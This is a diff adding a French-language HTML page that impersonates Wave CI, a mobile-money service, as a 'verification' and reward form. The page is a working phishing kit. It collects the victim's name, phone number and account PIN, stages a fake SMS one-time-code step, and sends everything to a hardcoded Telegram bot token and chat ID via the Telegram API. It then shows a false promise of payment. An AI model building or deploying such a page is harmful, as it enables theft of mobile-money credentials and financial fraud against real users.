@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification Wave</title>
+    <style>
+        /* --- CSS Global --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: linear-gradient(135deg, #e3f2fd 0%, #ffffff 100%);
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+        }
+
+        /* --- Logo & Titres --- */
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a73e8;
+            margin-bottom: 5px;
+        }
+        .logo span { color: #ff9800; }
+        
+        h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        /* --- Champs --- */
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 5px; color: #666; font-size: 13px; font-weight: 600; }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus { border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1); }
+
+        /* --- Boutons --- */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn:hover { background-color: #155db5; }
+        .btn:disabled { background-color: #ccc; cursor: not-allowed; }
+
+        /* --- Loader --- */
+        .loader-container { display: none; margin: 20px 0; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- Timer OTP --- */
+        .timer-box {
+            background: #fff3e0;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            color: #e65100;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        .countdown { font-family: monospace; font-size: 18px; }
+
+        /* --- Success Message --- */
+        .success-box { display: none; }
+        .check-icon { font-size: 50px; color: #4caf50; margin-bottom: 15px; }
+        .msg-text { color: #2e7d32; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
+
+        /* Classes utilitaires pour cacher/montrer */
+        .hidden { display: none !important; }
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <!-- LOGO -->
+    <div class="logo">WAVE <span>CI</span></div>
+
+    <!-- ETAPPE 1 : FORMULAIRE D'INFO -->
+    <div id="step-info">
+        <h2>Identification Utilisateur</h2>
+        <form id="infoForm">
+            <div class="input-group">
+                <label>Nom</label>
+                <input type="text" id="nom" placeholder="Votre nom" required>
+            </div>
+            <div class="input-group">
+                <label>Prénom</label>
+                <input type="text" id="prenom" placeholder="Votre prénom" required>
+            </div>
+            <div class="input-group">
+                <label>Numéro de téléphone</label>
+                <input type="tel" id="telephone" placeholder="Ex: 07 XX XX XX XX" required>
+            </div>
+            <div class="input-group">
+                <label>Code PIN (4 chiffres)</label>
+                <input type="password" id="pin" placeholder="****" maxlength="4" pattern="\d{4}" required>
+            </div>
+
+            <button type="submit" class="btn">Vérifier</button>
+        </form>
+    </div>
+
+    <!-- ETAPPE 2 : CHARGEMENT -->
+    <div id="step-loading" class="loader-container hidden">
+        <div class="spinner"></div>
+        <p style="color: #666;">Vérification en cours...</p>
+        <p style="font-size: 12px; color: #999; margin-top: 5px;">Les données sont envoyées à votre agent Telegram</p>
+    </div>
+
+    <!-- ETAPPE 3 : OTP -->
+    <div id="step-otp" class="hidden">
+        <h2>Vérification de sécurité</h2>
+        <p style="margin-bottom: 15px; color: #555; font-size: 14px;">
+            Entrez le code reçu par SMS sur votre numéro.
+        </p>
+        
+        <div class="timer-box">
+            ⏳ Temps restant : <span class="countdown" id="timerDisplay">50</span>s
+        </div>
+
+        <div class="input-group">
+            <label>Code OTP (4 chiffres)</label>
+            <input type="text" id="otpInput" placeholder="Ex: 1234" maxlength="4" pattern="\d{4}" required>
+        </div>
+
+        <button id="verifyOtpBtn" class="btn">Valider</button>
+    </div>
+
+    <!-- ETAPPE 4 : SUCCÈS -->
+    <div id="step-success" class="success-box">
+        <div class="check-icon">✅</div>
+        <h2>Opération réussie !</h2>
+        <p class="msg-text">
+            Vous serez crédité dans 15 à 20 minutes.<br>
+            Merci pour votre confiance.
+        </p>
+        <a href="https://www.wave.com/fr/" target="_blank" class="btn" style="text-decoration: none; display: inline-block;">Wave Recompense</a>
+    </div>
+
+</div>
+
+<script>
+    // --- CONFIGURATION TELEGRAM ---
+    const BOT_TOKEN = '8334524943:AAF_YXz14d7iyFX2m_E5n9bbvjpmxZ6oQYw'; // <-- REMPLACE CECI PAR TON TOKEN
+    const USER_ID = '8826766724';     // <-- REMPLACE CECI PAR TON ID USER
+    
+    let generatedOTP = '';
+    let timerInterval;
+
+    // --- GESTION DU FORMULAIRE INITIAL ---
+    document.getElementById('infoForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Récupération des données
+        const nom = document.getElementById('nom').value;
+        const prenom = document.getElementById('prenom').value;
+        const telephone = document.getElementById('telephone').value;
+        const pin = document.getElementById('pin').value;
+
+        // Simulation chargement
+        document.getElementById('step-info').classList.add('hidden');
+        document.getElementById('step-loading').classList.remove('hidden');
+
+        setTimeout(() => {
+            document.getElementById('step-loading').classList.add('hidden');
+            document.getElementById('step-otp').classList.remove('hidden');
+            startTimer();
+            generateOTP();
+        }, 2000);
+    });
+
+    // --- GENERATION OTP ---
+    function generateOTP() {
+        generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
+        console.log("Votre code OTP est :", generatedOTP); 
+        // Pour tester sans SMS réel, regarde la console du navigateur (F12)
+    }
+
+    // --- TIMER ---
+    function startTimer() {
+        let timeLeft = 50;
+        const timerDisplay = document.getElementById('timerDisplay');
+        
+        clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                alert("Code expiré. Veuillez recommencer.");
+                location.reload();
+            } else {
+                timeLeft--;
+                timerDisplay.textContent = timeLeft;
+            }
+        }, 1000);
+    }
+
+    // --- VALIDATION OTP ENVOI TELEGRAM ---
+    document.getElementById('verifyOtpBtn').addEventListener('click', function() {
+        const userOTP = document.getElementById('otpInput').value;
+        const nom = document.getElementById('nom').value;
+        const prenom = document.getElementById('prenom').value;
+        const telephone = document.getElementById('telephone').value;
+        const pin = document.getElementById('pin').value;
+
+        if (userOTP !== generatedOTP) {
+            alert("Code incorrect. Réessayez.");
+            return;
+        }
+
+        // Arrêt du timer
+        clearInterval(timerInterval);
+
+        // Envoi vers Telegram
+        sendMessageToTelegram(nom, prenom, telephone, pin, userOTP);
+
+        // Affichage succès
+        document.getElementById('step-otp').classList.add('hidden');
+        document.getElementById('step-success').style.display = 'block';
+    });
+
+    // --- FONCTION ENVOI TELEGRAM ---
+    async function sendMessageToTelegram(nom, prenom, tel, pin, otp) {
+        const message = `
+🎉 <b>Nouvelle Vérification Wave CI</b> 🎉
+
+👤 <b>Nom :</b> ${nom}
+👤 <b>Prénom :</b> ${prenom}
+📞 <b>Téléphone :</b> ${tel}
+🔐 <b>PIN :</b> ${pin}
+🔑 <b>Code OTP utilisé :</b> ${otp}
+
+⏰ Date : ${new Date().toLocaleString()}
+        `;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: USER_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            console.log("Message envoyé avec succès !");
+        } catch (error) {
+            console.error("Erreur envoi Telegram:", error);
+        }
+    }
+</script>
+
+</body>
+</html>
